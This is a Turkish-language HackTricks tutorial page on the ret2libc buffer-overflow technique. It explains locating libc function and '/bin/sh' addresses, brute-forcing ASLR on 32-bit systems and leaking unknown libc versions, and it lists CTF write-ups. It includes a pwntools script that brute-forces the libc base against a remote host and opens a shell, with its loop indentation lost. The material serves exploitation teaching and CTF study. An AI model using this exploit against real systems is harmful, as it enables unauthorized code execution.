# Ret2lib

<details>

<summary><strong>Sıfırdan kahraman olmaya kadar AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

## **Temel Bilgiler**

**Ret2Libc**'nin özü, zayıf bir programın yürütme akışını, saldırgan tarafından sağlanan shellcode'ın yığında yürütülmesi yerine, paylaşılan bir kütüphane içindeki bir işlevine yönlendirmektir (örneğin, **system**, **execve**, **strcpy**). Saldırgan, geri dönüş adresini değiştiren bir yük oluşturur ve yığında istenen kütüphane işlevine işaret eder, aynı zamanda çağrı konvansiyonuna göre gerekli argümanların doğru şekilde ayarlanmasını sağlar.

### **Örnek Adımlar (basitleştirilmiş)**

* Çağrılacak işlevin adresini alın (örneğin, system) ve çağrılacak komutu belirleyin (örneğin, /bin/sh)
* İlk argümanı komut dizinine işaret edecek şekilde ve yürütme akışını işleve geçirecek şekilde ROP zinciri oluşturun

## Adresleri Bulma

* Kullanılan `libc`'nin mevcut makineden olduğunu varsayarsak, hafızada nerede yükleneceğini aşağıdaki komutla bulabilirsiniz:

{% code overflow="wrap" %}
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
{% endcode %}

Eğer ASLR'nin libc adresini değiştirip değiştirmediğini kontrol etmek istiyorsanız, şunu yapabilirsiniz:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
* Kullanılan libc bilindiğinde, `system` işlevine olan ofseti bulmak da mümkündür:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
* Kullanılan libc bilindiğinde, `/bin/sh` dizesinin işlevine olan ofseti bulmak da mümkündür:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### gdb-peda / GEF Kullanımı

Kullanılan libc bilindiğinde, Peda veya GEF kullanılarak **system** fonksiyonunun, **exit** fonksiyonunun ve **`/bin/sh`** dizesinin adresini elde etmek de mümkündür:
```bash
p system
p exit
find "/bin/sh"
```
### /proc/\<PID>/maps Kullanımı

Eğer işlem her seferinde **çocuklar** oluşturuyorsa (ağ sunucusu) o dosyayı **okumayı** deneyin (muhtemelen root olmanız gerekecektir).

Burada işlem içinde **libc'nin tam olarak nerede yüklendiğini** ve işlemin her çocuğu için **nerede yükleneceğini** bulabilirsiniz.

![](<../../../.gitbook/assets/image (850).png>)

Bu durumda **0xb75dc000** adresine yüklendi (Bu libc'nin taban adresi olacaktır)

## Bilinmeyen libc

Binary'nin yüklediği libc'yi **bilmediğiniz olabilir** (çünkü erişiminizin olmadığı bir sunucuda olabilir). Bu durumda zafiyeti **sızdırmak için kullanarak bazı adresleri sızdırabilir ve hangi libc** kütüphanesinin kullanıldığını bulabilirsiniz:

{% content-ref url="rop-leaking-libc-address/" %}
[rop-leaking-libc-address](rop-leaking-libc-address/)
{% endcontent-ref %}

Ve bunun için bir pwntools şablonunu şurada bulabilirsiniz:

{% content-ref url="rop-leaking-libc-address/rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-address/rop-leaking-libc-template.md)
{% endcontent-ref %}

### 2 Ofset ile libc'yi Tanıma

[https://libc.blukat.me/](https://libc.blukat.me/) sayfasını kontrol edin ve libc içindeki fonksiyonların **birkaç adresini** kullanarak **kullanılan sürümü** bulun.

## 32 bit'te ASLR'yi Atlatma

Bu brute-force saldırıları **yalnızca 32 bit sistemler için** kullanışlıdır.

* Eğer saldırı yerel ise, libc'nin taban adresini brute-force etmeyi deneyebilirsiniz (32 bit sistemler için kullanışlıdır):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* Uzak bir sunucuyu hedef alıyorsanız, `libc` fonksiyonu `usleep` adresini **10 (örneğin) olarak argüman geçerek** **brute-force** deneyebilirsiniz. Eğer sunucu cevap vermek için **10 saniye daha fazla zaman alıyorsa**, bu fonksiyonun adresini buldunuz demektir.

## One Gadget

Belirli bir adrese sadece atlayarak kabuk çalıştırın libc'de:

{% content-ref url="one-gadget.md" %}
[one-gadget.md](one-gadget.md)
{% endcontent-ref %}

## x86 Ret2lib Kod Örneği

Bu örnekte ASLR brute-force kod içine entegre edilmiş ve zafiyetli ikili dosya uzak bir sunucuda bulunmaktadır:
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## x64 Ret2lib Kod Örneği

Örneği kontrol et:

{% content-ref url="../" %}
[..](../)
{% endcontent-ref %}

## Ret-into-printf (veya puts)

Bu, `printf`/`puts`'ı belirli verilerle bir argüman olarak çağırarak işlemdeki bilgileri sızdırmaya olanak tanır.

## Ret2printf

Bu temelde, bir `Ret2lib`'i `printf` format dizesi açıklıklarına dönüştürmek için `ret2lib`'i kullanarak `printf`'i değerlerle çağırmak anlamına gelir (anlamsız görünse de mümkündür):

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

## Diğer Örnekler ve referanslar

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)
* Verilen bir sızıntı ile Ret2lib, libc'teki bir işlevin adresine one gadget kullanarak çağrılır
* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64 bit, ASLR etkin ancak PIE yok, ilk adım bir taşma oluşturup canary'nin 0x00 baytına kadar doldurmak ve ardından puts'u çağırarak sızdırmaktır. Canary ile puts'un GOT'tan adresini sızdırmak için bir ROP gadget oluşturulur ve ardından `system('/bin/sh')`'ı çağırmak için bir ROP gadget oluşturulur.
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64 bit, ASLR etkin, canary yok, ana fonksiyonda bir çocuk fonksiyondan bir taşma oluşur. Puts'u çağırmak için ROP gadget'ı sızdırmak için puts'un GOT'tan adresini sızdırmak ve ardından bir one gadget çağırmak için ROP gadget'ı kullanılır.
* [https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html)
* 64 bit, pie yok, canary yok, relro yok, nx. Write işlevini kullanarak write (libc) adresini sızdırmak ve one gadget çağırmak için kullanır.
* [https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html)
* Stack'ten canary'yi sızdırmak için bir format dizesi kullanır ve `/bin/sh` adresiyle system'ı (GOT'ta) çağırmak için bir taşma oluşturur.
* [https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html)
* 32 bit, relro yok, canary yok, nx, pie. Bir kötü dizinlemeyi kötüye kullanarak libc ve heap adreslerini sızdırmak için stack'ten yararlanır. Buffer taşmasını kötüye kullanarak `system('/bin/sh')`'ı çağıran bir ret2lib yapar (bir kontrolü atlamak için heap adresine ihtiyaç vardır).
